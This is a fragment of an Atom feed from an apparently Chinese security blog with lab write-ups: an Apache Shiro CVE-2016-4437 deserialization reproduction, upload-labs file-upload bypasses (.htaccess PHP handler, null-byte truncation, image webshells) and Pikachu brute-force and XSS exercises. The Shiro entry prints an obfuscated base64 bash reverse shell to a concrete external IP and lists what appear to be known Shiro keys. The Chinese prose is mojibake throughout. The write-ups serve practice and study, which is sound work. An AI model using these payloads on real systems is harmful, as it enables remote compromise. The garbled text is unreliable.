class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><p>ä½¿ç”¨shiro_tool.jaråå¼¹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro_tool.jar http:<span class="comment">//your_ip:8080</span></span><br></pre></td></tr></table></figure><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_01.png" class><p>ä½¿ç”¨1å’Œ10éƒ½å¯ä»¥ï¼Œåå¼¹shelléœ€è¦ç¼–ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xOTUuMTU5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>ncç›‘å¬åå¼¹shell</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_02.png" class><p>æŠ“åŒ…åˆ†æï¼Œçœ‹åˆ°httpè¯·æ±‚å¤´Cookieå­—æ®µä¸º rememberMe=**ï¼Œå“åº”å¤´å­˜åœ¨Set-Cookie:rememberMe=deleteMe</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_03.png" class><h2 id="0x05-å®˜æ–¹ä¿®å¤"><a href="#0x05-å®˜æ–¹ä¿®å¤" class="headerlink" title="0x05.å®˜æ–¹ä¿®å¤"></a>0x05.å®˜æ–¹ä¿®å¤</h2><ul><li>åˆ é™¤ä»£ç é‡Œçš„é»˜è®¤å¯†é’¥</li><li>é»˜è®¤é…ç½®é‡Œæ³¨é‡Šäº†é»˜è®¤å¯†é’¥</li><li>å¦‚æœä¸é…ç½®å¯†é’¥ï¼Œæ¯æ¬¡ä¼šé‡æ–°éšæœºä¸€ä¸ªå¯†é’¥</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´&quot;&gt;&lt;a href=&quot;#ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´&quot;&gt;&lt;/a&gt;ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-æ¼æ´ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x01-æ¼æ´ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x01.æ¼æ´ç®€è¿°&quot;&gt;&lt;/a&gt;0x01.æ¼æ´ç®€è¿°&lt;/h2&gt;&lt;p&gt;Apache shiroé»˜è®¤ä½¿ç”¨äº†&lt;code&gt;CookieRememberMeManager&lt;/code&gt;ï¼Œå…¶å¤„ç†cookieçš„æµç¨‹æ˜¯ï¼šå¾—åˆ°&lt;code&gt;rememberMeçš„cookieå€¼&lt;/code&gt;â€“&amp;gt;&lt;code&gt;Base64è§£ç &lt;/code&gt;â€“&amp;gt;&lt;code&gt;AESè§£å¯†&lt;/code&gt;â€“&amp;gt;&lt;code&gt;ååºåˆ—åŒ–&lt;/code&gt;ã€‚&lt;br&gt;ç„¶è€ŒAESçš„å¯†é’¥æ˜¯ç¡¬ç¼–ç çš„ï¼Œå°±å¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ•°æ®é€ æˆååºåˆ—åŒ–çš„RCEæ¼æ´ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="è°ƒæ•™" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>upload_labs</title>
    <link href="https://lunamoore.github.io/2021/05/03/upload-labs/"/>
    <id>https://lunamoore.github.io/2021/05/03/upload-labs/</id>
    <published>2021-05-03T11:21:45.000Z</published>
    <updated>2021-05-03T11:40:24.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pass01-åŸºäºå‰ç«¯jséªŒè¯"><a href="#Pass01-åŸºäºå‰ç«¯jséªŒè¯" class="headerlink" title="Pass01.åŸºäºå‰ç«¯jséªŒè¯"></a>Pass01.åŸºäºå‰ç«¯jséªŒè¯</h2><p><code>ä¸Šä¼ å›¾ç‰‡æŠ“åŒ…æ”¹åç¼€</code></p><h2 id="Pass02-æ£€æµ‹MIMEç±»å‹"><a href="#Pass02-æ£€æµ‹MIMEç±»å‹" class="headerlink" title="Pass02.æ£€æµ‹MIMEç±»å‹"></a>Pass02.æ£€æµ‹MIMEç±»å‹</h2><p><code>ä¿®æ”¹MIMEä¸ºimage/jpeg</code></p><a id="more"></a><h2 id="Pass03-é»‘åå•-æ–‡ä»¶åç¼€ç»•è¿‡"><a href="#Pass03-é»‘åå•-æ–‡ä»¶åç¼€ç»•è¿‡" class="headerlink" title="Pass03.é»‘åå• æ–‡ä»¶åç¼€ç»•è¿‡"></a>Pass03.é»‘åå• æ–‡ä»¶åç¼€ç»•è¿‡</h2><p><code>é¦–å…ˆä¿®æ”¹apache2é…ç½®æ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apache2/mods-available/mime.conf</span><br><span class="line">æ‰¾åˆ°AddType applicationï¼Œå¢åŠ ä¸€è¡Œï¼Œé‡å¯æœåŠ¡</span><br><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht .php3</span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ .php5æ–‡ä»¶</code></p><img src="/2021/05/03/upload-labs/image-20210501125955299.png" class><h2 id="Pass04-é»‘åå•-htaccessç»•è¿‡"><a href="#Pass04-é»‘åå•-htaccessç»•è¿‡" class="headerlink" title="Pass04.é»‘åå• .htaccessç»•è¿‡"></a>Pass04.é»‘åå• .htaccessç»•è¿‡</h2><p><code>å…ˆä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">æ­¤æ¡ä¼ªé™æ€è§„åˆ™ä¸ºå°†demoæ–‡ä»¶è§£ææˆphpæ–‡ä»¶æ‰§è¡Œ</span><br><span class="line">&lt;FilesMatch &quot;demo&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">ä¹Ÿå¯ä»¥æ˜¯ä»¥ä¸‹ï¼Œå°†æ‰€æœ‰æ–‡ä»¶è§£æä¸ºphp</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><code>æœ¬æ¬¡ä½¿ç”¨ç¬¬äºŒæ¡ï¼Œå°†æ‰€æœ‰æ–‡ä»¶è§£æä¸ºphp</code></p><img src="/2021/05/03/upload-labs/image-20210501130707455.png" class><h2 id="Pass05-é»‘åå•-å¤§å°å†™ç»•è¿‡"><a href="#Pass05-é»‘åå•-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass05.é»‘åå• å¤§å°å†™ç»•è¿‡"></a>Pass05.é»‘åå• å¤§å°å†™ç»•è¿‡</h2><p><code>ç¦æ­¢ä¸Šä¼ .htaccess</code></p><img src="/2021/05/03/upload-labs/image-20210501131324884.png" class><h2 id="Pass06-é»‘åå•-ç©ºæ ¼ç»•è¿‡"><a href="#Pass06-é»‘åå•-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass06.é»‘åå• ç©ºæ ¼ç»•è¿‡"></a>Pass06.é»‘åå• ç©ºæ ¼ç»•è¿‡</h2><p><code>ç¦æ­¢ä¸Šä¼ .htaccess</code></p><p><code>åœ¨æ–‡ä»¶ååŠ ä¸€ä¸ªç©ºæ ¼å³å¯(éœ€è¦åœ¨windowsç¯å¢ƒä¸‹ï¼Œwidowsè‡ªåŠ¨å»ç©ºæ ¼å’Œç‚¹)</code></p><h2 id="Pass07-é»‘åå•-ç‚¹ç»•è¿‡"><a href="#Pass07-é»‘åå•-ç‚¹ç»•è¿‡" class="headerlink" title="Pass07.é»‘åå• ç‚¹ç»•è¿‡"></a>Pass07.é»‘åå• ç‚¹ç»•è¿‡</h2><p><code>ç¦æ­¢ä¸Šä¼ .htaccess</code></p><p><code>åœ¨æ–‡ä»¶ååŠ ä¸€ä¸ªç‚¹å³å¯(æœ€å¥½åœ¨windowsç¯å¢ƒä¸‹)</code></p><img src="/2021/05/03/upload-labs/image-20210501134215848.png" class><h2 id="Pass08-é»‘åå•-DATAç»•è¿‡"><a href="#Pass08-é»‘åå•-DATAç»•è¿‡" class="headerlink" title="Pass08.é»‘åå• ::$DATAç»•è¿‡"></a>Pass08.é»‘åå• ::$DATAç»•è¿‡</h2><p><code>æ–‡ä»¶åç¼€æ·»åŠ ::$DATAç»•è¿‡(windowsç¯å¢ƒ)</code></p><h2 id="Pass09-é»‘åå•-ç‚¹ç©ºç‚¹ç»•è¿‡"><a href="#Pass09-é»‘åå•-ç‚¹ç©ºç‚¹ç»•è¿‡" class="headerlink" title="Pass09.é»‘åå• ç‚¹ç©ºç‚¹ç»•è¿‡"></a>Pass09.é»‘åå• ç‚¹ç©ºç‚¹ç»•è¿‡</h2><p><code>ä¼šåˆ é™¤æ–‡ä»¶åçš„ç‚¹ï¼Œåœ¨æ–‡ä»¶åæ·»åŠ . .è¿›è¡Œç»•è¿‡(windowç¯å¢ƒ)</code></p><h2 id="Pass10-é»‘åå•-åŒå†™åç¼€ç»•è¿‡"><a href="#Pass10-é»‘åå•-åŒå†™åç¼€ç»•è¿‡" class="headerlink" title="Pass10.é»‘åå• åŒå†™åç¼€ç»•è¿‡"></a>Pass10.é»‘åå• åŒå†™åç¼€ç»•è¿‡</h2><p><code>ä»å‰åŒ¹é…phpè¿›è¡Œåˆ é™¤ï¼ŒåŒå†™ç»•è¿‡</code></p><h2 id="Pass11-ç™½åå•-00ç»•è¿‡"><a href="#Pass11-ç™½åå•-00ç»•è¿‡" class="headerlink" title="Pass11.ç™½åå• %00ç»•è¿‡"></a>Pass11.ç™½åå• %00ç»•è¿‡</h2><p><code>getä¼ å‚è·¯å¾„å¯æ§</code></p><img src="/2021/05/03/upload-labs/image-20210501173709601.png" class><p><code>PHPç‰ˆæœ¬å°äº5.3.4 å…³é—­GPC</code></p><img src="/2021/05/03/upload-labs/image-20210501180802917.png" class><h2 id="Pass12-ç™½åå•-0x00ç»•è¿‡"><a href="#Pass12-ç™½åå•-0x00ç»•è¿‡" class="headerlink" title="Pass12.ç™½åå• 0x00ç»•è¿‡"></a>Pass12.ç™½åå• 0x00ç»•è¿‡</h2><blockquote><p>shell_get.php%00</p></blockquote><p><code>åŒä¸Šï¼Œç”±äºpostä¼ å‚æ‰€ä»¥å°†%00è¿›è¡Œurlç¼–ç </code></p><img src="/2021/05/03/upload-labs/image-20210501182130172.png" class><h2 id="Pass13-æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass13-æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass13.æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ å›¾ç‰‡é©¬ç»•è¿‡"></a>Pass13.æ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ å›¾ç‰‡é©¬ç»•è¿‡</h2><img src="/2021/05/03/upload-labs/image-20210501184645711.png" class><h2 id="Pass14-getimagesize-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass14-getimagesize-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass14.getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ å›¾ç‰‡é©¬ç»•è¿‡"></a>Pass14.getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ å›¾ç‰‡é©¬ç»•è¿‡</h2><p><code>åŒä¸Š</code></p><h2 id="Pass15-exif-imagetype-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶-å›¾ç‰‡é©¬ç»•è¿‡"><a href="#Pass15-exif-imagetype-æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶-å›¾ç‰‡é©¬ç»•è¿‡" class="headerlink" title="Pass15.exif_imagetype()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ å›¾ç‰‡é©¬ç»•è¿‡"></a>Pass15.exif_imagetype()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ å›¾ç‰‡é©¬ç»•è¿‡</h2><p><code>åŒä¸Š</code></p><h2 id="Pass16-å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"><a href="#Pass16-å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="Pass16.å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“"></a>Pass16.å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“</h2><p><code>å°†äºŒæ¬¡æ¸²æŸ“åæ–‡ä»¶æœªå˜åŒ–çš„éƒ¨åˆ†æ·»åŠ ä¸€å¥è¯ï¼Œå†æ¬¡ä¸Šä¼ ï¼Œå†åŒ…å«ï¼Œèšå‰‘è¿æ¥ã€‚æœ¬æ¡ˆä¾‹ä½¿ç”¨gifï¼Œå›¾ç‰‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸Šä¼ ä¸ä¸Šå»ã€‚</code> </p><img src="/2021/05/03/upload-labs/image-20210503180938026.png" class><h2 id="Pass17-æ¡ä»¶ç«äº‰"><a href="#Pass17-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass17.æ¡ä»¶ç«äº‰"></a>Pass17.æ¡ä»¶ç«äº‰</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnVqaWVhY2UuY29tL3BlbmV0cmF0aW9uLXRlc3QvdXBsb2FkLWxhYnMtcGFzcy0xNy5odG1s">å¤§ä½¬çš„æ–‡ç« <i class="fa fa-external-link-alt"></i></span></p><p><code>å…ˆmoveå†åˆ¤æ–­ï¼Œç¬¦åˆç™½åå•å°±é‡å‘½åï¼Œä¸ç¬¦åˆå°±unlinkã€‚</code></p><p><code>ä½†æ˜¯æˆ‘å›¾ç‰‡é©¬ç›´æ¥å°±å¯ä»¥äº†ï¼Œä¸ºäº†å­¦ä¹ æ–°çŸ¥è¯†ï¼Œä¹Ÿç”¨å¤§ä½¬çš„æ–¹æ³•åšäº†ä¸€é</code></p><h2 id="Pass18-æ¡ä»¶ç«äº‰"><a href="#Pass18-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass18.æ¡ä»¶ç«äº‰"></a>Pass18.æ¡ä»¶ç«äº‰</h2><p><code>ä¸pass17ç±»ä¼¼</code></p><h2 id="Pass19-ç»•è¿‡"><a href="#Pass19-ç»•è¿‡" class="headerlink" title="Pass19./.ç»•è¿‡"></a>Pass19./.ç»•è¿‡</h2><p><code>move_uploaded_fileä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ /.</code></p><img src="/2021/05/03/upload-labs/image-20210503190859889.png" class><img src="/2021/05/03/upload-labs/image-20210503191007583.png" class><h2 id="Pass20-ä»£ç å®¡è®¡-æ•°ç»„ç»•è¿‡"><a href="#Pass20-ä»£ç å®¡è®¡-æ•°ç»„ç»•è¿‡" class="headerlink" title="Pass20.ä»£ç å®¡è®¡ æ•°ç»„ç»•è¿‡"></a>Pass20.ä»£ç å®¡è®¡ æ•°ç»„ç»•è¿‡</h2><p><code>ç›´æ¥å‚è€ƒå¤§ä½¬çš„æ–‡ç« </code></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQwMjk3OTUvYXJ0aWNsZS9kZXRhaWxzLzEwMjkxNzE5OQ==">åœ°å€<i class="fa fa-external-link-alt"></i></span></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Pass01-åŸºäºå‰ç«¯jséªŒè¯&quot;&gt;&lt;a href=&quot;#Pass01-åŸºäºå‰ç«¯jséªŒè¯&quot; class=&quot;headerlink&quot; title=&quot;Pass01.åŸºäºå‰ç«¯jséªŒè¯&quot;&gt;&lt;/a&gt;Pass01.åŸºäºå‰ç«¯jséªŒè¯&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ä¸Šä¼ å›¾ç‰‡æŠ“åŒ…æ”¹åç¼€&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pass02-æ£€æµ‹MIMEç±»å‹&quot;&gt;&lt;a href=&quot;#Pass02-æ£€æµ‹MIMEç±»å‹&quot; class=&quot;headerlink&quot; title=&quot;Pass02.æ£€æµ‹MIMEç±»å‹&quot;&gt;&lt;/a&gt;Pass02.æ£€æµ‹MIMEç±»å‹&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ä¿®æ”¹MIMEä¸ºimage/jpeg&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Webé¶åœº" scheme="https://lunamoore.github.io/categories/Web%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Pikachué¶æœº</title>
    <link href="https://lunamoore.github.io/2021/04/28/Pikachu/"/>
    <id>https://lunamoore.github.io/2021/04/28/Pikachu/</id>
    <published>2021-04-28T06:13:40.000Z</published>
    <updated>2021-05-03T11:35:43.332Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-æš´åŠ›ç ´è§£"><a href="#0x01-æš´åŠ›ç ´è§£" class="headerlink" title="0x01.æš´åŠ›ç ´è§£"></a>0x01.æš´åŠ›ç ´è§£</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Burte Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰æ¦‚è¿°</span><br><span class="line">â€œæš´åŠ›ç ´è§£â€æ˜¯ä¸€æ”»å‡»æ‰‹æ®µï¼Œåœ¨webæ”»å‡»ä¸­ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ç§æ‰‹æ®µå¯¹åº”ç”¨ç³»ç»Ÿçš„è®¤è¯ä¿¡æ¯è¿›è¡Œè·å–ã€‚ </span><br><span class="line">å…¶è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨å¤§é‡çš„è®¤è¯ä¿¡æ¯åœ¨è®¤è¯æ¥å£è¿›è¡Œå°è¯•ç™»å½•ï¼Œç›´åˆ°å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ </span><br><span class="line">ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæš´åŠ›ç ´è§£ä¸€èˆ¬ä¼šä½¿ç”¨å¸¦æœ‰å­—å…¸çš„å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚</span><br><span class="line">ç†è®ºä¸Šæ¥è¯´ï¼Œå¤§å¤šæ•°ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥è¢«æš´åŠ›ç ´è§£çš„ï¼Œåªè¦æ”»å‡»è€…æœ‰è¶³å¤Ÿå¼ºå¤§çš„è®¡ç®—èƒ½åŠ›å’Œæ—¶é—´ï¼Œæ‰€ä»¥æ–­å®šä¸€ä¸ªç³»ç»Ÿæ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œå…¶æ¡ä»¶ä¹Ÿä¸æ˜¯ç»å¯¹çš„ã€‚ </span><br><span class="line">æˆ‘ä»¬è¯´ä¸€ä¸ªwebåº”ç”¨ç³»ç»Ÿå­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œä¸€èˆ¬æ˜¯æŒ‡è¯¥webåº”ç”¨ç³»ç»Ÿæ²¡æœ‰é‡‡ç”¨æˆ–è€…é‡‡ç”¨äº†æ¯”è¾ƒå¼±çš„è®¤è¯å®‰å…¨ç­–ç•¥ï¼Œå¯¼è‡´å…¶è¢«æš´åŠ›ç ´è§£çš„â€œå¯èƒ½æ€§â€å˜çš„æ¯”è¾ƒé«˜ã€‚ </span><br><span class="line">è¿™é‡Œçš„è®¤è¯å®‰å…¨ç­–ç•¥, åŒ…æ‹¬ï¼š</span><br><span class="line">1.æ˜¯å¦è¦æ±‚ç”¨æˆ·è®¾ç½®å¤æ‚çš„å¯†ç ï¼›</span><br><span class="line">2.æ˜¯å¦æ¯æ¬¡è®¤è¯éƒ½ä½¿ç”¨å®‰å…¨çš„éªŒè¯ç ï¼ˆæƒ³æƒ³ä½ ä¹°ç«è½¦ç¥¨æ—¶è¾“çš„éªŒè¯ç ï½ï¼‰æˆ–è€…æ‰‹æœºotpï¼›</span><br><span class="line">3.æ˜¯å¦å¯¹å°è¯•ç™»å½•çš„è¡Œä¸ºè¿›è¡Œåˆ¤æ–­å’Œé™åˆ¶ï¼ˆå¦‚ï¼šè¿ç»­5æ¬¡é”™è¯¯ç™»å½•ï¼Œè¿›è¡Œè´¦å·é”å®šæˆ–IPåœ°å€é”å®šç­‰ï¼‰ï¼›</span><br><span class="line">4.æ˜¯å¦é‡‡ç”¨äº†åŒå› ç´ è®¤è¯ï¼›</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="01-åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#01-åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="01.åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>01.åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h3><p><code>æ²¡æœ‰éªŒè¯ï¼Œç›´æ¥çˆ†ç ´</code></p><img src="/2021/04/28/Pikachu/image-20210426093055435.png" class><img src="/2021/04/28/Pikachu/image-20210426093144110.png" class><img src="/2021/04/28/Pikachu/image-20210426093156702.png" class><img src="/2021/04/28/Pikachu/image-20210426093250664.png" class><h3 id="02-éªŒè¯ç ç»•è¿‡-on-server"><a href="#02-éªŒè¯ç ç»•è¿‡-on-server" class="headerlink" title="02.éªŒè¯ç ç»•è¿‡(on server)"></a>02.éªŒè¯ç ç»•è¿‡(on server)</h3><p><code>å½“éªŒè¯ç è¾“å…¥æ­£ç¡®ã€ä¸ºç©ºå’Œè¾“å…¥é”™è¯¯ä¼šæ˜¯ä»¥ä¸‹3ç§æƒ…å†µï¼š</code></p><img src="/2021/04/28/Pikachu/image-20210426093447946.png" class><img src="/2021/04/28/Pikachu/image-20210426093726275.png" class><img src="/2021/04/28/Pikachu/image-20210426093751155.png" class><p><code>ç»•è¿‡çš„æ€è·¯å°±æ˜¯è§‚å¯ŸéªŒè¯ç ä¼šä¸æ˜¯è®¤è¯ä¸€æ¬¡å°±åˆ·æ–°</code></p><p><code>è¿™é‡Œæ›´æ”¹ç”¨æˆ·åå¯†ç ï¼Œä¸æ›´æ”¹éªŒè¯ç ï¼Œè¿”å›çš„ç»“æœå‡ä¸ºè´¦æˆ·å¯†ç é”™è¯¯ï¼Œå¯ä»¥å¾—å‡ºéªŒè¯ç ä¸æ˜¯è®¤è¯ä¸€æ¬¡åˆ·æ–°ä¸€æ¬¡</code></p><img src="/2021/04/28/Pikachu/image-20210426094235586.png" class><img src="/2021/04/28/Pikachu/image-20210426094442761.png" class><p><code>æ¥ä¸‹æ¥æŒ‰ç…§ä¸Šä¸€é¢˜è¿›è¡Œçˆ†ç ´å³å¯</code></p><h3 id="03-éªŒè¯ç ç»•è¿‡-on-client"><a href="#03-éªŒè¯ç ç»•è¿‡-on-client" class="headerlink" title="03.éªŒè¯ç ç»•è¿‡(on client)"></a>03.éªŒè¯ç ç»•è¿‡(on client)</h3><p><code>å‰ç«¯çš„éªŒè¯ç›´æ¥bpæŠ“åŒ…å³å¯ï¼ŒåŒä¸Š</code></p><img src="/2021/04/28/Pikachu/image-20210426095048409.png" class><h2 id="0x02-XSS"><a href="#0x02-XSS" class="headerlink" title="0x02.XSS"></a>0x02.XSS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰æ¦‚è¿°</span><br><span class="line">Cross-Site Scripting ç®€ç§°ä¸ºâ€œCSSâ€ï¼Œä¸ºé¿å…ä¸å‰ç«¯å æˆæ ·å¼è¡¨çš„ç¼©å†™&quot;CSS&quot;å†²çªï¼Œæ•…åˆç§°XSSã€‚</span><br><span class="line">ä¸€èˆ¬XSSå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç§å¸¸è§ç±»å‹ï¼š</span><br><span class="line">    1.åå°„æ€§XSS;</span><br><span class="line">    2.å­˜å‚¨å‹XSS;</span><br><span class="line">    3.DOMå‹XSS;</span><br><span class="line"></span><br><span class="line">XSSæ¼æ´ä¸€ç›´è¢«è¯„ä¼°ä¸ºwebæ¼æ´ä¸­å±å®³è¾ƒå¤§çš„æ¼æ´ï¼Œåœ¨OWASP TOP10çš„æ’åä¸­ä¸€ç›´å±äºå‰ä¸‰çš„æ±Ÿæ¹–åœ°ä½ã€‚</span><br><span class="line">XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œæ‰€ä»¥å…¶å±å®³çš„å¯¹è±¡ä¹Ÿæ˜¯å‰ç«¯ç”¨æˆ·ã€‚</span><br><span class="line">å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚</span><br><span class="line">å› æ­¤åœ¨XSSæ¼æ´çš„é˜²èŒƒä¸Šï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨â€œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤â€å’Œâ€œè¾“å‡ºè¿›è¡Œè½¬ä¹‰â€çš„æ–¹å¼è¿›è¡Œå¤„ç†:</span><br><span class="line">  è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥;</span><br><span class="line">  è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰;</span><br></pre></td></tr></table></figure><h3 id="01-åå°„å‹xss-get"><a href="#01-åå°„å‹xss-get" class="headerlink" title="01.åå°„å‹xss(get)"></a>01.åå°„å‹xss(get)</h3><p><code>æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‰“</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="02-åå°„å‹xss-post"><a 